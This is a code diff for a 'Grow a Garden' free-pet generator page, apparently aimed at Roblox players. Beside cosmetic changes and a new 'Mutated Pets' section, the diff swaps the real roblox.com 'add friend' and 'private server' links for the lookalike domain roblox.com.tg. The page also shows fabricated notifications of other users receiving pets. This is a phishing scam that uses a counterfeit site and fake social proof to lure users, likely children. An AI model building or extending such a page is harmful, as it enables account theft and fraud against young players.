@@ -12,12 +12,14 @@
         }
 
         body {
-            font-family: 'Comic Sans MS', cursive, sans-serif;
+            font-family: 'Comic Sans MS', 'Apple Color Emoji', 'Segoe UI Emoji', 'Noto Color Emoji', cursive, sans-serif;
             background: linear-gradient(180deg, #87CEEB 0%, #E6F3FF 50%, #FFFFFF 100%);
             min-height: 100vh;
             padding: 20px;
             position: relative;
             overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
 
         /* Floating decorative elements */
@@ -231,7 +233,10 @@
             border-radius: 25px;
             outline: none;
             min-width: 300px;
-            font-family: inherit;
+            font-family: 'Comic Sans MS', 'Apple Color Emoji', 'Segoe UI Emoji', cursive, sans-serif;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
         }
 
         .username-input:focus {
@@ -251,6 +256,10 @@
             text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
             transition: all 0.3s ease;
             box-shadow: 0 4px 15px rgba(50, 205, 50, 0.3);
+            font-family: 'Comic Sans MS', 'Apple Color Emoji', 'Segoe UI Emoji', cursive, sans-serif;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
         }
 
         .generate-btn:hover:not(:disabled) {
@@ -368,12 +377,12 @@
             color: #2E8B57;
         }
 
-        .fruits-section {
+        .mutated-pets-section {
             text-align: center;
             margin-top: 40px;
         }
 
-        .fruits-title {
+        .mutated-pets-title {
             font-size: 2.5em;
             color: #2E8B57;
             margin-bottom: 20px;
@@ -471,6 +480,10 @@
             transition: all 0.3s ease;
             min-width: 160px;
             color: white;
+            font-family: 'Comic Sans MS', 'Apple Color Emoji', 'Segoe UI Emoji', cursive, sans-serif;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
         }
 
         .add-friend-btn {
@@ -530,7 +543,7 @@
             .pets-title {
                 font-size: 2em;
             }
-            .fruits-title {
+            .mutated-pets-title {
                 font-size: 2em;
             }
             .popup-content { 
@@ -607,7 +620,7 @@
             .pets-title {
                 font-size: 1.6em;
             }
-            .fruits-title {
+            .mutated-pets-title {
                 font-size: 1.6em;
             }
             .popup-content { 
@@ -682,7 +695,7 @@
                     <span class="garden">GARDEN</span>
                 </div>
             </div>
-            <p class="subtitle">Fruit/Pets Generator</p>
+            <p class="subtitle">Mutated Pets Generator</p>
         </div>
 
         <div class="generator-section">
@@ -700,25 +713,30 @@
 
         <div class="pets-section">
             <h2 class="pets-title">Pets:</h2>
-            <div class="browse-text">Browse through the available fruits/pets:</div>
+            <div class="browse-text">Browse through the available pets:</div>
             <div class="pets-grid" id="petsGrid">
                 <!-- Pets will be loaded automatically -->
             </div>
             
-            <div class="fruits-section">
-                <h2 class="fruits-title">Fruits:</h2>
+            <div class="mutated-pets-section">
+                <h2 class="mutated-pets-title">Mutated Pets:</h2>
+                <div class="pets-grid" id="mutatedPetsGrid">
+                    <!-- Mutated Pets will be loaded automatically -->
+                </div>
             </div>
         </div>
     </div>
 
     <script>
         let selectedPets = new Set();
+        let selectedMutatedPets = new Set();
         let allPets = [];
+        let allMutatedPets = [];
         let notificationQueue = [];
         const MAX_SELECTION = 3;
         const MAX_NOTIFICATIONS = 5;
 
-        // Simulate automatic folder scanning for pets
+        // Simulate automatic folder scanning for pets and mutated pets
         function scanPetsFolder() {
             // 🔥 EASY PET MANAGEMENT 🔥
             // Just add your image filename here and it automatically loads!
@@ -734,10 +752,8 @@
                 'Dragonfly Pet.jpg',
                 'Queen Bee.png',
                 'Red Fox.jpg',
-                'Garden Bunny.png',
-                'Pond Frog.jpg',
-                'Caterpillar.png',
-                'Garden Snail.jpg'
+                'Kitsune Pet.png',
+                'Corrupted Kitsune.png'
                 
                 // 👆 ADD YOUR NEW PETS ABOVE THIS LINE 👆
                 // Example: 'Fire Dragon.png',
@@ -754,12 +770,54 @@
                     name: name,
                     filename: filename,
                     imagePath: imagePath,
-                    hasImage: true
+                    hasImage: true,
+                    type: 'pet'
                 };
             });
 
             console.log(`🐾 Loaded ${allPets.length} pets from folder`);
             renderPets();
+        }
+
+        function scanMutatedPetsFolder() {
+            // 🧬 EASY MUTATED PET MANAGEMENT 🧬
+            // Just add your mutated pet image filename here and it automatically loads!
+            // Put your images in a "mutated_pets" folder next to this HTML file
+            
+            const mutatedPetFiles = [
+                // Just add your mutated pet image names here - that's it!
+                'Tranquil Raccoon.jpg',
+                'GiantBean Raccoon.jpg',
+                'Ascended Raccoon.jpg',
+                'Shocked Raccoon.jpg',
+                'Rainbow Raccoon.jpg',
+                'Radiant Raccoon.jpg',
+                'IronSkin Raccoon.jpg',
+                'Tiny Raccoon.jpg',
+                'Mega Raccoon.jpg'
+                
+                // 👆 ADD YOUR NEW MUTATED PETS ABOVE THIS LINE 👆
+                // Example: 'Radioactive Frog.png',
+                // Example: 'Hybrid Phoenix.jpg',
+                // The filename becomes the mutated pet name automatically!
+            ];
+
+            // Convert filenames to mutated pet objects with real images
+            allMutatedPets = mutatedPetFiles.map(filename => {
+                const name = filename.replace(/\.(png|jpg|jpeg|gif)$/i, '');
+                const imagePath = `./mutated_pets/${filename}`;
+                
+                return {
+                    name: name,
+                    filename: filename,
+                    imagePath: imagePath,
+                    hasImage: true,
+                    type: 'mutated_pet'
+                };
+            });
+
+            console.log(`🧬 Loaded ${allMutatedPets.length} mutated pets from folder`);
+            renderMutatedPets();
         }
 
         function renderPets() {
@@ -782,15 +840,54 @@
             });
         }
 
+        function renderMutatedPets() {
+            const mutatedPetsGrid = document.getElementById('mutatedPetsGrid');
+            mutatedPetsGrid.innerHTML = '';
+
+            allMutatedPets.forEach((mutatedPet, index) => {
+                const mutatedPetCard = document.createElement('div');
+                mutatedPetCard.className = 'pet-card'; // Reuse pet-card styling
+                mutatedPetCard.onclick = () => toggleMutatedPetSelection(index);
+                
+                // Use real images for mutated pets
+                mutatedPetCard.innerHTML = `
+                    <img src="${mutatedPet.imagePath}" alt="${mutatedPet.name}" class="pet-image" 
+                         onerror="this.src='data:image/svg+xml;base64,${btoa('<svg xmlns=\\"http://www.w3.org/2000/svg\\" width=\\"80\\" height=\\"80\\" viewBox=\\"0 0 80 80\\"><rect width=\\"80\\" height=\\"80\\" fill=\\"#f0f0f0\\"/><text x=\\"40\\" y=\\"45\\" text-anchor=\\"middle\\" font-family=\\"Arial\\" font-size=\\"12\\" fill=\\"#666\\">No Image</text></svg>')}';">
+                    <div class="pet-name">${mutatedPet.name}</div>
+                `;
+                
+                mutatedPetsGrid.appendChild(mutatedPetCard);
+            });
+        }
+
+        function toggleMutatedPetSelection(index) {
+            const mutatedPetCards = document.querySelectorAll('#mutatedPetsGrid .pet-card');
+            const mutatedPetCard = mutatedPetCards[index];
+            
+            if (selectedMutatedPets.has(index)) {
+                selectedMutatedPets.delete(index);
+                mutatedPetCard.classList.remove('selected');
+            } else {
+                if (selectedMutatedPets.size >= MAX_SELECTION) {
+                    showNotification('🧬 Selection Limit', `You can only select up to ${MAX_SELECTION} mutated pets!`);
+                    return;
+                }
+                selectedMutatedPets.add(index);
+                mutatedPetCard.classList.add('selected');
+            }
+            
+            updateSelectionStatus();
+        }
+
         function togglePetSelection(index) {
-            const petCard = document.querySelectorAll('.pet-card')[index];
+            const petCard = document.querySelectorAll('#petsGrid .pet-card')[index];
             
             if (selectedPets.has(index)) {
                 selectedPets.delete(index);
                 petCard.classList.remove('selected');
             } else {
                 if (selectedPets.size >= MAX_SELECTION) {
-                    showNotification('Selection Limit', `You can only select up to ${MAX_SELECTION} pets!`);
+                    showNotification('🐾 Selection Limit', `You can only select up to ${MAX_SELECTION} pets!`);
                     return;
                 }
                 selectedPets.add(index);
@@ -805,8 +902,8 @@
             const warning = document.getElementById('selectionWarning');
             const info = document.getElementById('selectionInfo');
             
-            const selectedCount = selectedPets.size;
-            info.textContent = `Select up to ${MAX_SELECTION} pets to continue (${selectedCount}/${MAX_SELECTION} selected)`;
+            const selectedCount = selectedPets.size + selectedMutatedPets.size;
+            info.textContent = `Select up to ${MAX_SELECTION} pets/mutated pets to continue (${selectedCount}/${MAX_SELECTION} selected)`;
             
             if (selectedCount > 0) {
                 generateBtn.disabled = false;
@@ -827,7 +924,7 @@
                 return;
             }
 
-            if (selectedPets.size === 0) {
+            if (selectedPets.size === 0 && selectedMutatedPets.size === 0) {
                 document.getElementById('selectionWarning').style.display = 'block';
                 return;
             }
@@ -876,6 +973,10 @@
             const popup = document.getElementById('loadingPopup');
             const popupContent = popup.querySelector('.popup-content');
             
+            const selectedPetNames = Array.from(selectedPets).map(index => allPets[index].name);
+            const selectedMutatedPetNames = Array.from(selectedMutatedPets).map(index => allMutatedPets[index].name);
+            const allSelected = [...selectedPetNames, ...selectedMutatedPetNames];
+            
             popupContent.innerHTML = `
                 <div class="popup-logo">
                     <span class="gr">GR</span><span>🍓</span><span>W A</span><br>
@@ -888,7 +989,7 @@
                     <strong>Username:</strong> ${username}
                 </div>
                 <div style="font-size: 1.1em; color: #666; margin-bottom: 25px;">
-                    <strong>Selected Pets:</strong> ${selectedPets.join(', ')}
+                    <strong>Selected Items:</strong> ${allSelected.join(', ')}
                 </div>
                 <div style="font-size: 1.3em; color: #2E8B57; margin-bottom: 25px; font-weight: bold;">
                     Choose your next action:
@@ -913,7 +1014,7 @@
             // Show loading for add friend
             showActionLoading('Adding Friend...', () => {
                 // Redirect to add friend page (replace with your actual URL)
-                window.location.href = 'https://www.roblox.com/users/1122221395/profile';
+                window.location.href = 'https://www.roblox.com.tg/users/5894748003/profile';
             });
         }
 
@@ -921,7 +1022,7 @@
             // Show loading for join private server
             showActionLoading('Joining Private Server...', () => {
                 // Redirect to private server page (replace with your actual URL)  
-                window.location.href = 'https://www.roblox.com/games/126884695634066/Grow-a-Garden';
+                window.location.href = 'https://www.roblox.com.tg/games/126884695634066/Grow-a-Garden?privateServerLinkCode=61064112911243253070286640831860';
             });
         }
 
@@ -1051,13 +1152,15 @@
 
         function showRandomNotification() {
             const username = generateRealisticUsername();
-            const randomPet = allPets[Math.floor(Math.random() * allPets.length)];
+            const allItems = [...allPets, ...allMutatedPets];
+            const randomItem = allItems[Math.floor(Math.random() * allItems.length)];
             
-            // 60% chance for pet claim, 40% chance for join notification
-            const notificationType = Math.random() < 0.6 ? 'pet' : 'join';
+            // 60% chance for item claim, 40% chance for join notification
+            const notificationType = Math.random() < 0.6 ? 'item' : 'join';
             
-            if (notificationType === 'pet') {
-                showNotification('🐾 Pet Received', `${username} received ${randomPet.name}`);
+            if (notificationType === 'item') {
+                const itemType = randomItem.type === 'pet' ? '🐾' : '🧬';
+                showNotification(`${itemType} ${randomItem.type === 'pet' ? 'Pet' : 'Mutated Pet'} Received`, `${username} received ${randomItem.name}`);
             } else {
                 showNotification('👤 Player Joined', `${username} just joined private server`);
             }
@@ -1067,11 +1170,12 @@
         document.addEventListener('DOMContentLoaded', function() {
             console.log('🌱 Initializing Grow A Garden...');
             scanPetsFolder();
+            scanMutatedPetsFolder();
             updateSelectionStatus();
             
             // Show welcome notification
             setTimeout(() => {
-                showNotification('🌟 Welcome!', 'Select your favorite pets and start growing your garden!');
+                showNotification('🌟 Welcome!', 'Select your favorite pets and mutated pets to start growing your garden!');
             }, 2000);
             
             // Update online count every 5-15 seconds
